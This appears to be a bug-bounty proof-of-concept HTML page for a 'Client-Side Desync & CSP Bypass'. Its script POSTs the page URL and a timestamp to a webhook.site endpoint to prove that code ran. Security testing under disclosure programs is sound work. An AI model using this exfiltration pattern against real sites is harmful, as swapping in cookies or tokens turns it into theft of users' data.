<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PoC - Client-Side Desync & CSP Bypass</title>
</head>
<body>
<h2>PoC - Client-Side Desync & CSP Bypass</h2>
<p>هذا الاختبار مخصص لحسابي الشخصي فقط ضمن برنامج الإفصاح.</p>

<script>
// رابط الويبهوك الخاص بك
const webhookUrl = "https://webhook.site/6779eec5-8f34-4065-80c4-b471fe8c032b";

// بيانات تجريبية - إثبات التنفيذ فقط
const payload = {
    msg: "PoC Successful",
    page: location.href,
    timestamp: new Date().toISOString()
};

// إرسال البيانات إلى Webhook
fetch(webhookUrl, {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
})
.then(res => console.log("تم إرسال البيانات:", res.status))
.catch(err => console.error("خطأ في الإرسال:", err));
</script>

</body>
</html>
